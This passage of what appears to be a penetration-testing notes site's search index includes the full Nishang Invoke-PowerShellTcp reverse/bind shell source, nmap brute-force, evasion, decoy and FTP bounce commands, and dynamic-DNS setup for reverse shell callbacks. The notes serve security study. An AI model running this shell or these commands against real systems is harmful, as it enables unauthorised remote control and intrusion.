utilize PowerShell commands to navigate and take actions against the host.</p>","tags":["payloads","tools"]},{"location":"nishang/#invoke-powershelltcp","title":"Invoke-PowershellTcp","text":"<pre><code>function Invoke-PowerShellTcp \n{ \n&lt;#\n.SYNOPSIS\nNishang script which can be used for Reverse or Bind interactive PowerShell from a target. \n.DESCRIPTION\nThis script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. \nAlso, a standard Netcat can connect to this script Bind to a specific port.\nThe script is derived from Powerfun written by Ben Turner &amp; Dave Hardy\n.PARAMETER IPAddress\nThe IP address to connect to when using the -Reverse switch.\n.PARAMETER Port\nThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.\n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on \nthe given IP and port. \n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Bind -Port 4444\nAbove shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. \n.EXAMPLE\nPS &gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444\nAbove shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be\nlistening on the given IP and port. \n.LINK\nhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html\nhttps://github.com/nettitude/powershell/blob/master/powerfun.ps1\nhttps://github.com/samratashok/nishang\n#&gt;      \n    [CmdletBinding(DefaultParameterSetName=\"reverse\")] Param(\n\n        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=\"bind\")]\n        [String]\n        $IPAddress,\n\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"reverse\")]\n        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=\"bind\")]\n        [Int]\n        $Port,\n\n        [Parameter(ParameterSetName=\"reverse\")]\n        [Switch]\n        $Reverse,\n\n        [Parameter(ParameterSetName=\"bind\")]\n        [Switch]\n        $Bind\n\n    )\n\n\n    try \n    {\n        #Connect back if the reverse switch is used.\n        if ($Reverse)\n        {\n            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)\n        }\n\n        #Bind to the provided port if Bind switch is used.\n        if ($Bind)\n        {\n            $listener = [System.Net.Sockets.TcpListener]$Port\n            $listener.start()    \n            $client = $listener.AcceptTcpClient()\n        } \n\n        $stream = $client.GetStream()\n        [byte[]]$bytes = 0..65535|%{0}\n\n        #Send back current username and computername\n        $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\")\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        #Show an interactive PowerShell prompt\n        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')\n        $stream.Write($sendbytes,0,$sendbytes.Length)\n\n        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n        {\n            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding\n            $data = $EncodedText.GetString($bytes,0, $i)\n            try\n            {\n                #Execute the command on the target.\n                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )\n            }\n            catch\n            {\n                Write-Warning \"Something went wrong with execution of command on the target.\" \n                Write-Error $_\n            }\n            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '\n            $x = ($error[0] | Out-String)\n            $error.clear()\n            $sendback2 = $sendback2 + $x\n\n            #Return the results\n            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n            $stream.Write($sendbyte,0,$sendbyte.Length)\n            $stream.Flush()  \n        }\n        $client.Close()\n        if ($listener)\n        {\n            $listener.Stop()\n        }\n    }\n    catch\n    {\n        Write-Warning \"Something went wrong! Check if the server is reachable and you are using the correct port.\" \n        Write-Error $_\n    }\n}\n</code></pre>","tags":["payloads","tools"]},{"location":"nmap/","title":"nmap - A network exploration and security auditing tool","text":"Sources of this notes <ul> <li>HackTheBox Academy: Network enumeration with nmap</li> <li>nmap documentation.</li> </ul>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#description","title":"Description","text":"<p>Network Mapper is an open source tool for network exploration and security auditing. Free and open-source scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packages and analyzing the responses. Another discovery feature is that of operating system detection. These features are extensible by scripts that provide more advanced service detection.</p> <pre><code>nmap &lt;scan types&gt; &lt;options&gt; $ip\n</code></pre> <pre><code># commonly used\nnmap -sT -Pn --unprivileged --script banner $ip\n\n# enumerate ciphers supported by the application server\nnmap -sT -p 443 -Pn -unprivileged --script ssl-enum-ciphers $ip\n\n# sync-scan the top 10,000 most well-known ports\nnmap -sS $ip --top-ports 10000\n</code></pre> <p>Worthwhile for understanding how packages are sent and received is the --packet-trace option. Also --reason displays the reason for specific result.</p> <p>Also, Nmap does not always recognize all information by default. Sometimes you can use netcat to interpelate a service:</p> <pre><code> nc -nv $ip &lt;PORT NUMBER&gt;\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#cheat-sheet","title":"Cheat Sheet","text":"<p>By default, Nmap will conduct a TCP scan unless specifically requested to perform a UDP scan. </p> <pre><code>nmap 10.0.2.1\nnmap 10.0.2.1/24\nnmap 10.0.2.1-254\nnmap 10.0.*.*\nnmap 10.0.2.1,3,17\nnmap 10.0.2,4.1,3,17\nnmap domain.com\nnmap 10.0.2.1 -p 3389\nnmap 10.0.2.1 -p 80,3389\nnmap 10.0.2.1 -p 50-90\nnmap 10.0.2.1 -p U:53, T:80\n\n# ***** Saving results ******\n# -----------------------------------------\n# -oN: Normal output with .nmap file extension\n# -oG: Grepable output with the .gnmap file extension\n# -oX: XML output  with the .xml file extension\n# -oA: Save results in all formats\n# -oA target: Saves the results in all formats, starting the name of each file with 'target'.\nsudo nmap $ip -oA path/to/target\n\n\n# It forces port enumeration and it's not limited to 1000 ports\nnmap $ip -p-     \n\n# Disables port scanning. If we disable port scan (`-sn`), Nmap automatically ping scan with `ICMP Echo Requests` (`-PE`). Also called ping scan or ping sweep. More reliable that pinging the broadcast address because hosts do not reply to broadcast queries).\nnmap -sn $ip\n\n# Disables DNS resolution.\nnmap -n $ip\n\n# Disables ARP ping.\nnmap $ip --disable-arp-ping\n\n# This option skips the host discovery stage altogether. It deactivates the ICMP echo requests\nnmap  -Pn  $ip  \n\n# Scans top 100 ports.\nnmap  -F  $ip \n\n# Shows the progress of the scan every 5 seconds.\nnmap $ip --stats-every=5s\n\n# To skip host discovery and port scan, while still allowing NMAP Scripting Engine to run, we use -Pn -sn combined.\nnmap -Pn -sn $ip\n\n# OS detection\nnmap -O $ip \n\n# Limit OS detection to promising targets\nnmap -O $ip -osscan-limit\n\n# Guess OS more aggressively\nnmap -O $ip -osscan-guess\n\n# Version detection\nnmap -sV $ip \n\n# Intensity level goes from 0 to 9\nnmap -sV $ip \u2013-version-intensity 8  \n\n# tcpwrapped means that the TCP handshake was completed, \n# but the remote host closed the connection without receiving any data. \n# This means that something is blocking connectivity with the target host. \n\n# OS detection + version detection + script scanning + traceroute\nnmap -A $ip\n\n# Half-open scanning. SYN + SYN ACK + RST\n# A well-configured IDS will still detect the scan\nnmap -sS $ip\n\n# TCP connect scan: SYN + SYN ACK + ACK + DATA (banner) +RST\n# This scan gets recorded in the application logs on the target systems\nnmap -sT $ip\n\n# Scan a list of hosts. One per line in the file\nnmap -sn -iL $ip hosttoscanlist.txt \n\n# List targets to scan\nnmap -sL $ip \n\n# Full scanner\nnmap -sC -sV -p- $ip  \n# The script scan `-sC` flag causes `Nmap` to report the server headers `http-server-header` page and the page title `http-title` for any web page hosted on the webserver.\n\n\n# UDP quick\nnmap -sU -sV  $ip\n\n# Called ACK scan. Returns if the port is filtered or not. Useful to determine if there is a firewall.\nnmap -sA $ip \n\n# It sends a ACK packet. In the response we pay attention to the windows size of the TCP header. If the windows size is different from zero, the port is open. If it is zero, then port is either closed or filtered. \nnmap -sW $ip\n</code></pre> <p>To redirect results to a file &gt; targetfile.txt</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#search-and-run-a-script-in-nmap","title":"Search and run a script in nmap","text":"<p>NSE: Nmap Scripting Engine.</p> <pre><code># All scripts are located under:\n/usr/share/nmaps/script\n\n\nlocate -r nse$|grep &lt;term&gt;\n# if this doesn\u2019t work, update the db with:\nsudo updatedb\n\n\n# Also:\nlocate scripts/&lt;nameOfservice&gt;\n</code></pre> <p>Run a script:</p> <pre><code># Run default scripts \nnmap $ip -sC\n\n# Run  scripts from a category. See categories below\nnmap $ip --script &lt;category&gt;\n\n# Run defined scripts\nnmap --script &lt;script-name&gt;,&lt;script-name&gt;,&lt;script-name&gt; -p&lt;port&gt; $ip\n\n# Run custom scripts: \n# Save them in /usr/share/nmaps/script\n</code></pre> <p>NSE (Nmap Script Engine) provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided: </p> Category Description <code>auth</code> Determination of authentication credentials. <code>broadcast</code> Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. <code>brute</code> Executes scripts that try to log in to the respective service by brute-forcing with credentials. <code>default</code> Default scripts executed by using the <code>-sC</code> option. Syntax: <code>sudo nmap $ip -sC</code> <code>discovery</code> Evaluation of accessible services. <code>dos</code> These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. <code>exploit</code> This category of scripts tries to exploit known vulnerabilities for the scanned port. <code>external</code> Scripts that use external services for further processing. <code>fuzzer</code> This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time. <code>intrusive</code> Intrusive scripts that could negatively affect the target system. <code>malware</code> Checks if some malware infects the target system. <code>safe</code> Defensive scripts that do not perform intrusive and destructive access. <code>version</code> Extension for service detection. <code>vuln</code> Identification of specific vulnerabilities.","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#general-vulnerability-assessment","title":"General vulnerability assessment","text":"<pre><code>sudo nmap $ip -p 80 -sV --script vuln \n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#port-21-footprinting-ftp","title":"Port 21: footprinting FTP","text":"<pre><code># Locate all ftp scripts related\nfind / -type f -name ftp* 2&gt;/dev/null | grep scripts\n\n# Run a general scanner for version, mode aggresive and perform default scripts\nsudo nmap -sV -p21 -sC -A $ip\n# ftp-anon NSE script checks whether the FTP server allows anonymous access.\n# ftp-syst, for example, executes the `STAT` command, which displays information about the FTP server status.\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#port-22-attack-a-ssh-connection","title":"Port 22: attack a ssh connection","text":"<pre><code>nmap $ip -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/nmap/nselib/data/passwords.lst\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#ports-137-138-139-445-footprinting-smb","title":"Ports 137, 138, 139, 445: footprinting SMB","text":"<pre><code>sudo nmap $ip -sV -sC -p139,445\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#grab-banners-of-services","title":"Grab banners of services","text":"<pre><code># Grab banner of services in an IP\nnmap -sV --script=banner $ip\n\n# Grab banners of services in a range\nnmap -sV --script=banner $ip/24\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#enumerate-samba-service-smb","title":"Enumerate samba service (smb)","text":"<pre><code># 1. Search for existing script for smb enumeration\nlocate -r nse$|grep &lt;term&gt;\n\n# 2. Select smb-enum-shares and run it\nnmap -script=smb-enum-shares $ip\n\n# 3. Retrieve users\nnmap -script=smb-enum-users $ip\n\n# 4. Retrieve groups with passwords and user\nnmap -script=smb-brute $ip\n\n# Interact with the SMB service to extract the reported operating system version\nnmap --script smb-os-discovery.nse -p445 $ip\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#performance","title":"Performance","text":"","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#introducing-delays-or-timeouts","title":"Introducing delays or Timeouts","text":"<p>When Nmap sends a packet, it takes some time (Round-Trip-Time - RTT) to receive a response from the scanned port. Generally, Nmap starts with a high timeout (--min-RTT-timeout) of 100ms. </p> <pre><code># While connecting to the service, we noticed that the connection took longer than usual (about 15 seconds). There are some services whose connection speed, or response time, can be configured. Now that we know that an FTP server is running on this port, we can deduce the origin of our \"failed\" scan. We could confirm this again by specifying the minimum `probe round trip time` (`--min-rtt-timeout`) in Nmap to 15 or 20 seconds and rerunning the scan.\nnmap $IP --min-rtt-timeout 15\n\n# Optimized RTT\nsudo nmap IP/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms\n# -F: Scans top 100 ports.\n# --initial-rtt-timeout 50ms: Sets the specified time value as initial RTT timeout.\n# --max-rtt-timeout 100ms: Sets the specified time value as maximum RTT timeout.\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#max-retries","title":"Max Retries","text":"<p>The default value for the retry rate is 10, so if Nmap does not receive a response for a port, it will not send any more packets to the port and will be skipped.</p> <pre><code>sudo nmap $ip/24 -F --max-retries 0\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#rates","title":"Rates","text":"<p>When setting the minimum rate (--min-rate) for sending packets, we tell <code>Nmap</code> to simultaneously send the specified number of packets.</p> <pre><code>sudo nmap $ip/24 -F --min-rate 300\n# --min-rate 300 Sets the minimum number of packets to be sent per second.\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#timing","title":"Timing","text":"<p>Nmap offers six different timing templates (<code>-T &lt;0-5&gt;</code>), being defaul one, -T 3.</p> Flag Mode -T 0 Paranoid -T 1 Sneaky -T 2 Polite -T 3 Normal -T 4 Aggressive -T 5 Insane <p>More on nmap documentation.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#firewall-and-idsips-evasion-with-nmap","title":"Firewall and IDS/IPS Evasion with nmap","text":"<p>An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state.</p> <ol> <li> <p>An adversary sends TCP packets with the ACK flag set and a sequence number of zero (which means that are not associated with an existing connection to target ports).</p> </li> <li> <p>An adversary uses the response from the target to determine the port's state. </p> <ul> <li>Filtered port: The target ignores the packets, and dropped them. No response is returned or ICMP error codes.</li> <li>Unfiltered port: The target rejects the packets and returned an RST flag and  different types of ICMP error codes (or none at all): Net Unreachable, Net Prohibited, Host Unreachable, Host Prohibited, Port Unreachable. If a RST packet is received the target port is either closed or the ACK was sent out-of-sync. </li> </ul> </li> </ol> <p>Unlike outgoing connections, all connection attempts (with the <code>SYN</code> flag) from external networks are usually blocked by firewalls. However, the packets with the <code>ACK</code> flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#detect-a-waf","title":"Detect a WAF","text":"<pre><code>nmap -p 80 -script http-waf-detect $ip \n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#decoys","title":"Decoys","text":"<p>There are cases in which administrators block specific subnets from different regions in principle. Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans. </p> <p>With the Decoy scanning method (-D), Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent.  </p> <pre><code>sudo nmap $ip -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\n# -D RND:5  Generates five random IP addresses that indicates the source IP the connection comes from.\n</code></pre> <p>Manually specify IP address (-S) for getting to services only accessible from individual subnets:</p> <pre><code>sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n# -n: Disables DNS resolution.\n# -Pn: Disables ICMP Echo requests.\n# -p 445: Scans only the specified ports.\n# -O: Performs operation system detection scan.\n# -S: Scans the target by using different source IP address.\n# -e tun0: Sends all requests through the specified interface.\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#dns-proxying","title":"DNS proxying","text":"<p>The DNS queries are made over the <code>UDP port 53</code>. The <code>TCP port 53</code> was previously only used for the so-called \"<code>Zone transfers</code>\" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.</p> <p>Bypassing demilitarized zone (DMZ) by specifying DNS servers ourselves (we can use the company's DNS server).  <code>--dns-server &lt;ns&gt;,&lt;ns&gt;</code></p> <p>We can also use TCP port 53 as a source port (<code>--source-port</code>) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through. </p> <p>Example:</p> <pre><code># Simple SYS-Scan of a filtered port\nsudo nmap $ip -p50000 -sS -Pn -n --disable-arp-ping --packet-trace\n# PORT      STATE    SERVICE\n# 50000/tcp filtered ibm-db2\n\n\n# SYN-Scan From DNS Port\n\n# PORT      STATE SERVICE\n# 50000/tcp open  ibm-db2\n</code></pre> <p>Following the example, a possible exploitation for this weak configuration would be:</p> <pre><code>\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#udp-scans-not-working-on-vpn-connections","title":"UDP scans not working on VPN connections","text":"<p>Explanation from https://www.reddit.com/r/nmap/comments/u08lud/havin_a_rough_go_of_trying_to_scan_a_subnet_with/:</p> <p>As others have pointed out, scanning over a VPN link means you are limited to\u00a0internet-layer\u00a0interactions and operations. The \"V\" in VPN stands for Virtual, and means that you are not actually on the same link as the other hosts in your subnet, so you can't get information about their link-layer connections any more than they can know whether you've connected to the VPN via Starbucks WiFi, an Ethernet cable, or a dial-up modem.</p> <p>You are further limited by the fact that Windows does not offer a general-purpose raw socket interface, so Nmap can't craft special packets at the network/internet layer. Usually we work around this by crafting Ethernet (link-layer) frames and injecting those with\u00a0Npcap, but VPN links do not use Ethernet frames, so that method doesn't work. We hope to be able to add this functionality in the future, but for now, VPNs are tricky to use with Npcap, and we haven't implemented PPTP or other VPN framing in Nmap to make it work. You can still do TCP Connect scanning (<code>-sT</code>), run most NSE scripts (<code>-sC</code>\u00a0or\u00a0<code>--script</code>), and do service version detection (<code>-sV</code>), but things like TCP SYN scan (<code>-sS</code>), UDP scanning (<code>-sU</code>), OS detection (<code>-O</code>), and traceroute (<code>--traceroute</code>) will not work.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#how-nmap-works","title":"How nmap works","text":"","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#ports","title":"Ports","text":"<p>Open port:</p> <p> This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.</p> <p>Filtered port:</p> <p> Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.</p> <p>Close port:</p> <p> When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an <code>RST</code> flag. This scanning method can also be used to determine if our target is alive or not.</p> <p>Unfiltered port: </p> <p>This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.</p> <p>**open|filtered ** port:</p> <p>If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.</p> <p>closed|filtered port:</p> <p>This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#probes-for-host-discovery","title":"Probes for HOST discovery","text":"<pre><code>TCP SYN probe (-PS &lt;portlist&gt;)\nTCP ACK probe (-PA &lt;portlist&gt;)\nUDP probe (-PU &lt;portlist&gt;)\nICMP Echo Request/Ping (-PE)\nICMP Timestamp Request (-PP)\nICMP Netmask Request (-PM)\n</code></pre> <p>List of the most filtered ports:  80, 25, 22, 443, 21, 113, 23, 53, 554, 3389, 1723. These are valuable ping ports.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#scans","title":"Scans","text":"","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#-ss-or-tcp-syn-scan","title":"-sS (or TCP SYN scan)","text":"<p>By default, <code>Nmap</code> scans the top 1000 TCP ports with the SYN scan (<code>-sS</code>). This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets. Therefore, by default, Nmap performs a SYN Scan, though it substitutes a connect scan if the user does not have proper privileges to send raw packets (requires root access on Unix). Unprivileged users can only execute connect and FTP bounce scans.</p> <ul> <li>If our target sends an\u00a0<code>SYN-ACK</code>\u00a0flagged packet back to the scanned port, Nmap detects that the port is\u00a0<code>open</code>.</li> <li>If the packet receives an\u00a0<code>RST</code>\u00a0flag, it is an indicator that the port is\u00a0<code>closed</code>.</li> <li>If Nmap does not receive a packet back, it will display it as\u00a0<code>filtered</code>. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.</li> </ul> <p></p> <ul> <li>No connection established, but we got our response.</li> <li>Technique referred as half-open scanning, because you don't open a full TCP connection.</li> </ul>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#-st-or-tcp-connect-scan","title":"-sT (or TCP Connect scan)","text":"<p>TCP connect scan is the default TCP scan type when SYN scan is not an option (when not running with privileges).  The Nmap TCP Connect Scan (-sT) uses the TCP three-way handshake to determine if a specific port on a target host is open or closed. The scan sends an <code>SYN</code> packet to the target port and waits for a response. It is considered open if the target port responds with an SYN-ACK packet and closed if it responds with an RST packet.</p> <p></p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#-sn-a-null-scan","title":"-sN (A NULL scan)","text":"<p>In the SYN message that nmap sends, TCP flag header is set to 0.</p> <p>If the response is:</p> <ul> <li>none: the port is open or filtered.</li> <li>RST: the port is closed.</li> <li>A response saying that it couldn't reach destiny, the port is filtered.</li> </ul>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#-sa-ack-scan","title":"-sA (ACK scan)","text":"<p>Returns if the port is filtered or  not. It's useful to detect a firewall. Filtered ports reveals the existence of some kind of firewall.</p> <p></p> <p>A variation of the TCP ACK scan is the TCP Windows scan.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#-sw-tcp-windows-scan","title":"-sW (TCP Windows scan)","text":"<p>It also sends an ACK packet. In the response we pay attention to the Windows size of the TCP header_</p> <ul> <li>If the windows size is different from 0, the port is open.</li> <li>If the windows size is 0, the port is either close or filtered.</li> </ul>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#how-to-identify-operating-system-using-ttl-value-and-ping-command","title":"How To Identify Operating System Using TTL Value And Ping Command","text":"<p>After running:</p> <pre><code>sudo nmap $ip -sn -oA host -PE --packet-trace --disable-arp-ping \n</code></pre> <p>We can get:</p> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CEST\nSENT (0.0107s) ICMP [10.10.14.2 &gt; 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]\nRCVD (0.0152s) ICMP [10.129.2.18 &gt; 10.10.14.2 Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]\nNmap scan report for 10.129.2.18\nHost is up (0.086s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n</code></pre> <p>You can quickly detect whether a system is running with Linux, or Windows or any other OS by looking at the TTL value from the output of the <code>ping</code> command. You don't need any extra applications to detect a remote system's OS. The default initial TTL value for Linux/Unix is 64, and TTL value for Windows is 128.</p> <p></p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#saving-the-results","title":"Saving the results","text":"<pre><code>-oN: Normal output with .nmap file extension\n-oG: Grepable output with the .gnmap file extension\n-oX: XML output  with the .xml file extension\n-oA: Save results in all formats\n</code></pre> <p>With the XML output, we can easily create HTML reports. To convert the stored results from XML format to HTML, we can use the tool  xsltproc.</p> <pre><code>xsltproc target.xml -o target.html\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#quick-techniques","title":"Quick techniques","text":"","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#host-enumeration-determining-if-host-is-alive-with-arp-ping","title":"Host Enumeration: Determining if host is alive with ARP ping","text":"<p>It can be done with <code>-packet-trace</code> or  with  <code>--reason</code>. </p> <pre><code>sudo nmap &lt;IP&gt; -sn -oA host o\n# -sn   Disables port scanning.\n# -oA host  Stores the results in all formats starting with the name 'host'.\n# -PE   Performs the ping scan by using 'ICMP Echo requests' against the target.\n# --packet-trace    Shows all packets sent and received\n</code></pre> <pre><code>sudo nmap &lt;IP&gt; -sn -oA host -PE --reason\n# -sn   Disables port scanning.\n# -oA host  Stores the results in all formats starting with the name 'host'.\n# -PE   Performs the ping scan by using 'ICMP Echo requests' against the target.\n# --reason  Displays the reason for specific result.\n</code></pre> <p>To disable ARP requests and scan our target with the desired <code>ICMP echo requests</code>, we can disable ARP pings by setting the \"<code>--disable-arp-ping</code>\" option.</p>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#port-scanning-having-a-clear-view-of-a-syn-scan-on-a-port","title":"Port scanning: having a clear view of a SYN scan on a port","text":"<p>To have a clear view of the SYN scan on port 21,  disable the ICMP echo requests (<code>-Pn</code>), DNS resolution (<code>-n</code>), and ARP ping scan (<code>--disable-arp-ping</code>).</p> <pre><code>sudo nmap &lt;IP&gt; -p 21 --packet-trace -Pn -n --disable-arp-ping\n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"nmap/#performing-a-ftp-bounce-attack","title":"Performing a FTP bounce attack","text":"<p>An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. For instance, consider we are targetting an FTP Server\u00a0<code>FTP_DMZ</code>\u00a0exposed to the internet. Another device within the same network,\u00a0<code>Internal_DMZ</code>, is not exposed to the internet. We can use the connection to the\u00a0<code>FTP_DMZ</code>\u00a0server to scan\u00a0<code>Internal_DMZ</code>\u00a0using the FTP Bounce attack and obtain information about the server's open ports.</p> <pre><code>nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz\n# -b The\u00a0`Nmap`\u00a0-b flag can be used to perform an FTP bounce attack: \n</code></pre>","tags":["reconnaissance","scanning","active recon","passiverecon"]},{"location":"noip/","title":"noip","text":"<p>When coding a reverse shell you don't need to hardcode the IP address of the attacker machine. Instead, you can use a Dynamic DNS server such as https://www.noip.com/. To inform this server of our attacker IP public address we will install a linux dynamic client on our kali (an agent that will do the trick).</p>","tags":["pentesting","python"]},{"location":"noip/#install-dynamic-update-client-on-linux","title":"Install Dynamic Update Client on Linux","text":"<p>As root user:</p> <pre><code>cd /usr/local/src/\nwget http://www.noip.com/client/linux/noip-duc-linux.tar.gz\ntar xf noip-duc-linux.tar.gz\ncd noip-2.1.9-1/\nmake install\n</code></pre>","tags":["pentesting","python"]},{"location":"nslookup/","title":"nslookup","text":"<p>With <code>Nslookup</code>, we can search for domain name servers on the Internet and ask them for information about hosts and domains.</p> <pre><code># Query `A` records by submitting a domain name: default behaviour\nnslookup $TARGET\n\n# We can use the `-query` parameter to search specific resource records\n# Querying: A Records for a Subdomain\nnslookup -query=A $TARGET\n\n# Querying: PTR Records for an IP Address\nnslookup -query=PTR 31.13.92.36\n\n# Querying: ANY Existing Records\nnslookup -query=ANY $TARGET\n\n# Querying: TXT Records\nnslookup -query=TXT $TARGET\n\n# Querying: MX Records\nnslookup -query=MX $TARGET\n\n#  Specify a nameserver if needed by adding `@&lt;nameserver/IP&gt;` to the command\n</code></pre> <p>References: - nslookup (https://linux.die.net/man/1/nslookup)  </p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"nt-authority-system/","title":"NT Authority System","text":"<p>The LocalSystem account <code>NT AUTHORITY\\SYSTEM</code> is a built-in account in Windows operating systems, used by the service control manager. It has the highest level of access in the OS (and can be made even more powerful with Trusted Installer privileges). This account has more privileges than a local administrator account and is used to run most Windows services. It is also very common for third-party services to run in the context of this account by default. The SYSTEM account has thist privileges: </p> <p>SE_ASSIGNPRIMARYTOKEN_NAME, SE_AUDIT_NAME, SE_BACKUP_NAME, SE_CHANGE_NOTIFY_NAME, SE_CREATE_GLOBAL_NAME, SE_CREATE_PAGEFILE_NAME, SE_CREATE_PERMANENT_NAME, SE_CREATE_TOKEN_NAME, SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_INC_BASE_PRIORITY_NAME, SE_INCREASE_QUOTA_NAME, SE_LOAD_DRIVER_NAME, SE_LOCK_MEMORY_NAME, SE_MANAGE_VOLUME_NAME, SE_PROF_SINGLE_PROCESS_NAME, SE_RESTORE_NAME, SE_SECURITY_NAME, SE_SHUTDOWN_NAME, SE_SYSTEM_ENVIRONMENT_NAME, SE_SYSTEMTIME_NAME,  SE_TAKE_OWNERSHIP_NAME, SE_TCB_NAME, SE_UNDOCK_NAME </p> <p>The SYSTEM account on a domain-joined host can enumerate Active Directory by impersonating the computer account, which is essentially a special user account. If you land on a domain-joined host with SYSTEM privileges during an assessment and cannot find any useful credentials in memory or other data on the machine, there are still many things you can do. Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account. The only real limitation is not being able to perform cross-trust Kerberos attacks such as Kerberoasting.</p> <p>There are several ways to gain 